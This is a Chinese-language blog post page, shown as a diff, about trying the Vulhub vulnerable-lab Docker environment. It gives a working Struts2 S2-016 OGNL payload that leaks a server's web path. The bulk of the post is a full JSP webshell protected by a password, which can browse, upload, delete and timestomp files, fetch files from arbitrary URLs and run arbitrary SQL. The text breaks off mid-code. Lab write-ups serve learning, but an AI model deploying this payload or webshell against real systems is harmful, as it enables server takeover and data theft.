@@ -1,0 +1,841 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="渗透,Vulhub,docker,Struts2," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="简介Vulhub 是github上的一个开源项目。 Vulhub是一个面向大众的开源漏洞靶场，无需docker知识，简单执行两条命令即可编译、运行一个完整的漏洞靶场镜像。  使用安装好docker后 12345678910111213141516171819# 启动docker服务service docker start# 安装composepip install docker-compose #">
+<meta name="keywords" content="渗透,Vulhub,docker,Struts2">
+<meta property="og:type" content="article">
+<meta property="og:title" content="初试Vulhub">
+<meta property="og:url" content="http://yoursite.com/2018/11/01/初试Vulhub/index.html">
+<meta property="og:site_name" content="Mugen">
+<meta property="og:description" content="简介Vulhub 是github上的一个开源项目。 Vulhub是一个面向大众的开源漏洞靶场，无需docker知识，简单执行两条命令即可编译、运行一个完整的漏洞靶场镜像。  使用安装好docker后 12345678910111213141516171819# 启动docker服务service docker start# 安装composepip install docker-compose #">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://yoursite.com/2018/11/01/初试Vulhub/1.jpg">
+<meta property="og:image" content="http://yoursite.com/2018/11/01/初试Vulhub/2.jpg">
+<meta property="og:updated_time" content="2018-11-01T07:15:14.738Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="初试Vulhub">
+<meta name="twitter:description" content="简介Vulhub 是github上的一个开源项目。 Vulhub是一个面向大众的开源漏洞靶场，无需docker知识，简单执行两条命令即可编译、运行一个完整的漏洞靶场镜像。  使用安装好docker后 12345678910111213141516171819# 启动docker服务service docker start# 安装composepip install docker-compose #">
+<meta name="twitter:image" content="http://yoursite.com/2018/11/01/初试Vulhub/1.jpg">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":true,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2018/11/01/初试Vulhub/"/>
+
+
+
+
+
+  <title>初试Vulhub | Mugen</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Mugen</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">lego's blog</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-links">
+          <a href="/links" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-flag"></i> <br />
+            
+            朋友
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于我
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/01/初试Vulhub/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="lego">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="https://raw.githubusercontent.com/legoc/legoc.github.io/master/about/index/baye.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Mugen">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">初试Vulhub</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-11-01T13:53:07+08:00">
+                2018-11-01
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
+                    <span itemprop="name">渗透测试</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o"></i> 阅读次数
+            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p><a href="https://github.com/vulhub/vulhub" target="_blank" rel="noopener">Vulhub</a> 是github上的一个开源项目。</p>
+<p>Vulhub是一个面向大众的开源漏洞靶场，无需docker知识，简单执行两条命令即可编译、运行一个完整的漏洞靶场镜像。 </p>
+<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>安装好docker后</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"># 启动docker服务</span><br><span class="line">service docker start</span><br><span class="line"></span><br><span class="line"># 安装compose</span><br><span class="line">pip install docker-compose </span><br><span class="line"></span><br><span class="line"># 下载项目</span><br><span class="line">wget https://github.com/vulhub/vulhub/archive/master.zip -O vulhub-master.zip</span><br><span class="line">unzip vulhub-master.zip</span><br><span class="line">cd vulhub-master</span><br><span class="line"></span><br><span class="line"># 进入某一个漏洞/环境的目录</span><br><span class="line">cd flask/ssti</span><br><span class="line"></span><br><span class="line"># 自动化编译环境</span><br><span class="line">docker-compose build</span><br><span class="line"></span><br><span class="line"># 启动整个环境</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
+<p>每个环境目录下都有相应的说明文件，请阅读该文件，进行漏洞/环境测试。</p>
+<p>测试完成后，删除整个环境</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose down -v</span><br></pre></td></tr></table></figure>
+<h3 id="初试Struts2-s2-016"><a href="#初试Struts2-s2-016" class="headerlink" title="初试Struts2 s2-016"></a>初试Struts2 s2-016</h3><p>之前经常看到Struts2系列的漏洞文章，但是一直没有实践过，如今正好来试试，</p>
+<p>具体原理现在还很菜就不多分析了，先感受一把黑阔的feel。</p>
+<p>打开靶场xx.xx.xx.xx:8080/index.action</p>
+<p>后面接上payload就可以爆路径</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?redirect%3A%24%7B%23req%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletRequest%27%29%2C%23a%3D%23req.getSession%28%29%2C%23b%3D%23a.getServletContext%28%29%2C%23c%3D%23b.getRealPath%28%22%2F%22%29%2C%23matt%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23matt.getWriter%28%29.println%28%23c%29%2C%23matt.getWriter%28%29.flush%28%29%2C%23matt.getWriter%28%29.close%28%29%7D</span><br></pre></td></tr></table></figure>
+<p>爆出路径</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/local/tomcat/webapps/ROOT/</span><br></pre></td></tr></table></figure>
+<p>用用之前安恒的那个Struts2检测工具</p>
+<p><img src="/2018/11/01/初试Vulhub/1.jpg" alt=""></p>
+<p>jsp一句话</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@page import=&quot;java.io.*,java.util.*,java.net.*,java.sql.*,java.text.*&quot;%&gt;</span><br><span class="line">&lt;%!String Pwd = &quot;lego&quot;;</span><br><span class="line"></span><br><span class="line">    String EC(String s, String c) throws Exception &#123;</span><br><span class="line">        return s;</span><br><span class="line">    &#125;//new String(s.getBytes(&quot;ISO-8859-1&quot;),c);&#125;</span><br><span class="line"></span><br><span class="line">    Connection GC(String s) throws Exception &#123;</span><br><span class="line">        String[] x = s.trim().split(&quot;\r\n&quot;);</span><br><span class="line">        Class.forName(x[0].trim()).newInstance();</span><br><span class="line">        Connection c = DriverManager.getConnection(x[1].trim());</span><br><span class="line">        if (x.length &gt; 2) &#123;</span><br><span class="line">            c.setCatalog(x[2].trim());</span><br><span class="line">        &#125;</span><br><span class="line">        return c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    void AA(StringBuffer sb) throws Exception &#123;</span><br><span class="line">        File r[] = File.listRoots();</span><br><span class="line">        for (int i = 0; i &lt; r.length; i++) &#123;</span><br><span class="line">            sb.append(r[i].toString().substring(0, 2));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    void BB(String s, StringBuffer sb) throws Exception &#123;</span><br><span class="line">        File oF = new File(s), l[] = oF.listFiles();</span><br><span class="line">        String sT, sQ, sF = &quot;&quot;;</span><br><span class="line">        java.util.Date dt;</span><br><span class="line">        SimpleDateFormat fm = new SimpleDateFormat(&quot;yyyy-MM-dd HH:mm:ss&quot;);</span><br><span class="line">        for (int i = 0; i &lt; l.length; i++) &#123;</span><br><span class="line">            dt = new java.util.Date(l[i].lastModified());</span><br><span class="line">            sT = fm.format(dt);</span><br><span class="line">            sQ = l[i].canRead() ? &quot;R&quot; : &quot;&quot;;</span><br><span class="line">            sQ += l[i].canWrite() ? &quot; W&quot; : &quot;&quot;;</span><br><span class="line">            if (l[i].isDirectory()) &#123;</span><br><span class="line">                sb.append(l[i].getName() + &quot;/\t&quot; + sT + &quot;\t&quot; + l[i].length()</span><br><span class="line">                        + &quot;\t&quot; + sQ + &quot;\n&quot;);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                sF += l[i].getName() + &quot;\t&quot; + sT + &quot;\t&quot; + l[i].length() + &quot;\t&quot;</span><br><span class="line">                        + sQ + &quot;\n&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        sb.append(sF);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    void EE(String s) throws Exception &#123;</span><br><span class="line">        File f = new File(s);</span><br><span class="line">        if (f.isDirectory()) &#123;</span><br><span class="line">            File x[] = f.listFiles();</span><br><span class="line">            for (int k = 0; k &lt; x.length; k++) &#123;</span><br><span class="line">                if (!x[k].delete()) &#123;</span><br><span class="line">                    EE(x[k].getPath());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        f.delete();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    void FF(String s, HttpServletResponse r) throws Exception &#123;</span><br><span class="line">        int n;</span><br><span class="line">        byte[] b = new byte[512];</span><br><span class="line">        r.reset();</span><br><span class="line">        ServletOutputStream os = r.getOutputStream();</span><br><span class="line">        BufferedInputStream is = new BufferedInputStream(new FileInputStream(s));</span><br><span class="line">        os.write((&quot;-&gt;&quot; + &quot;|&quot;).getBytes(), 0, 3);</span><br><span class="line">        while ((n = is.read(b, 0, 512)) != -1) &#123;</span><br><span class="line">            os.write(b, 0, n);</span><br><span class="line">        &#125;</span><br><span class="line">        os.write((&quot;|&quot; + &quot;&lt;-&quot;).getBytes(), 0, 3);</span><br><span class="line">        os.close();</span><br><span class="line">        is.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    void GG(String s, String d) throws Exception &#123;</span><br><span class="line">        String h = &quot;0123456789ABCDEF&quot;;</span><br><span class="line">        int n;</span><br><span class="line">        File f = new File(s);</span><br><span class="line">        f.createNewFile();</span><br><span class="line">        FileOutputStream os = new FileOutputStream(f);</span><br><span class="line">        for (int i = 0; i &lt; d.length(); i += 2) &#123;</span><br><span class="line">            os</span><br><span class="line">                    .write((h.indexOf(d.charAt(i)) &lt;&lt; 4 | h.indexOf(d</span><br><span class="line">                            .charAt(i + 1))));</span><br><span class="line">        &#125;</span><br><span class="line">        os.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    void HH(String s, String d) throws Exception &#123;</span><br><span class="line">        File sf = new File(s), df = new File(d);</span><br><span class="line">        if (sf.isDirectory()) &#123;</span><br><span class="line">            if (!df.exists()) &#123;</span><br><span class="line">                df.mkdir();</span><br><span class="line">            &#125;</span><br><span class="line">            File z[] = sf.listFiles();</span><br><span class="line">            for (int j = 0; j &lt; z.length; j++) &#123;</span><br><span class="line">                HH(s + &quot;/&quot; + z[j].getName(), d + &quot;/&quot; + z[j].getName());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            FileInputStream is = new FileInputStream(sf);</span><br><span class="line">            FileOutputStream os = new FileOutputStream(df);</span><br><span class="line">            int n;</span><br><span class="line">            byte[] b = new byte[512];</span><br><span class="line">            while ((n = is.read(b, 0, 512)) != -1) &#123;</span><br><span class="line">                os.write(b, 0, n);</span><br><span class="line">            &#125;</span><br><span class="line">            is.close();</span><br><span class="line">            os.close();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    void II(String s, String d) throws Exception &#123;</span><br><span class="line">        File sf = new File(s), df = new File(d);</span><br><span class="line">        sf.renameTo(df);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    void JJ(String s) throws Exception &#123;</span><br><span class="line">        File f = new File(s);</span><br><span class="line">        f.mkdir();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    void KK(String s, String t) throws Exception &#123;</span><br><span class="line">        File f = new File(s);</span><br><span class="line">        SimpleDateFormat fm = new SimpleDateFormat(&quot;yyyy-MM-dd HH:mm:ss&quot;);</span><br><span class="line">        java.util.Date dt = fm.parse(t);</span><br><span class="line">        f.setLastModified(dt.getTime());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    void LL(String s, String d) throws Exception &#123;</span><br><span class="line">        URL u = new URL(s);</span><br><span class="line">        int n;</span><br><span class="line">        FileOutputStream os = new FileOutputStream(d);</span><br><span class="line">        HttpURLConnection h = (HttpURLConnection) u.openConnection();</span><br><span class="line">        InputStream is = h.getInputStream();</span><br><span class="line">        byte[] b = new byte[512];</span><br><span class="line">        while ((n = is.read(b, 0, 512)) != -1) &#123;</span><br><span class="line">            os.write(b, 0, n);</span><br><span class="line">        &#125;</span><br><span class="line">        os.close();</span><br><span class="line">        is.close();</span><br><span class="line">        h.disconnect();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    void MM(InputStream is, StringBuffer sb) throws Exception &#123;</span><br><span class="line">        String l;</span><br><span class="line">        BufferedReader br = new BufferedReader(new InputStreamReader(is));</span><br><span class="line">        while ((l = br.readLine()) != null) &#123;</span><br><span class="line">            sb.append(l + &quot;\r\n&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    void NN(String s, StringBuffer sb) throws Exception &#123;</span><br><span class="line">        Connection c = GC(s);</span><br><span class="line">        ResultSet r = c.getMetaData().getCatalogs();</span><br><span class="line">        while (r.next()) &#123;</span><br><span class="line">            sb.append(r.getString(1) + &quot;\t&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        r.close();</span><br><span class="line">        c.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    void OO(String s, StringBuffer sb) throws Exception &#123;</span><br><span class="line">        Connection c = GC(s);</span><br><span class="line">        String[] t = &#123; &quot;TABLE&quot; &#125;;</span><br><span class="line">        ResultSet r = c.getMetaData().getTables(null, null, &quot;%&quot;, t);</span><br><span class="line">        while (r.next()) &#123;</span><br><span class="line">            sb.append(r.getString(&quot;TABLE_NAME&quot;) + &quot;\t&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        r.close();</span><br><span class="line">        c.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    void PP(String s, StringBuffer sb) throws Exception &#123;</span><br><span class="line">        String[] x = s.trim().split(&quot;\r\n&quot;);</span><br><span class="line">        Connection c = GC(s);</span><br><span class="line">        Statement m = c.createStatement(1005, 1007);</span><br><span class="line">        ResultSet r = m.executeQuery(&quot;select * from &quot; + x[3]);</span><br><span class="line">        ResultSetMetaData d = r.getMetaData();</span><br><span class="line">        for (int i = 1; i &lt;= d.getColumnCount(); i++) &#123;</span><br><span class="line">            sb.append(d.getColumnName(i) + &quot; (&quot; + d.getColumnTypeName(i)</span><br><span class="line">                    + &quot;)\t&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        r.close();</span><br><span class="line">        m.close();</span><br><span class="line">        c.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    void QQ(String cs, String s, String q, StringBuffer sb) throws Exception &#123;</span><br><span class="line">        int i;</span><br><span class="line">        Connection c = GC(s);</span><br><span class="line">        Statement m = c.createStatement(1005, 1008);</span><br><span class="line">        try &#123;</span><br><span class="line">            ResultSet r = m.executeQuery(q);</span><br><span class="line">            ResultSetMetaData d = r.getMetaData();</span><br><span class="line">            int n = d.getColumnCount();</span><br><span class="line">            for (i = 1; i &lt;= n; i++) &#123;</span><br><span class="line">                sb.append(d.getColumnName(i) + &quot;\t|\t&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">            sb.append(&quot;\r\n&quot;);</span><br><span class="line">            while (r.next()) &#123;</span><br><span class="line">                for (i = 1; i &lt;= n; i++) &#123;</span><br><span class="line">                    sb.append(EC(r.getString(i), cs) + &quot;\t|\t&quot;);</span><br><span class="line">                &#125;</span><br><span class="line">                sb.append(&quot;\r\n&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">            r.close();</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            sb.append(&quot;Result\t|\t\r\n&quot;);</span><br><span class="line">            try &#123;</span><br><span class="line">                m.executeUpdate(q);</span><br><span class="line">                sb.append(&quot;Execute Successfully!\t|\t\r\n&quot;);</span><br><span class="line">            &#125; catch (Exception ee) &#123;</span><br><span class="line">                sb.append(ee.toString() + &quot;\t|\t\r\n&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        m.close();</span><br><span class="line">        c.close();</span><br><span class="line">    &#125;%&gt;</span><br><span class="line">     </span><br><span class="line">     </span><br><span class="line">&lt;%</span><br><span class="line">    String cs = request.getParameter(&quot;z0&quot;)==null?&quot;gbk&quot;: request.getParameter(&quot;z0&quot;) + &quot;&quot;;</span><br><span class="line">    request.setCharacterEncoding(cs);</span><br><span class="line">    response.setContentType(&quot;text/html;charset=&quot; + cs);</span><br><span class="line">    String Z = EC(request.getParameter(Pwd) + &quot;&quot;, cs);</span><br><span class="line">    String z1 = EC(request.getParameter(&quot;z1&quot;) + &quot;&quot;, cs);</span><br><span class="line">    String z2 = EC(request.getParameter(&quot;z2&quot;) + &quot;&quot;, cs);</span><br><span class="line">    StringBuffer sb = new StringBuffer(&quot;&quot;);</span><br><span class="line">    try &#123;</span><br><span class="line">        sb.append(&quot;-&gt;&quot; + &quot;|&quot;);</span><br><span class="line">        if (Z.equals(&quot;A&quot;)) &#123;</span><br><span class="line">            String s = new File(application.getRealPath(request</span><br><span class="line">                    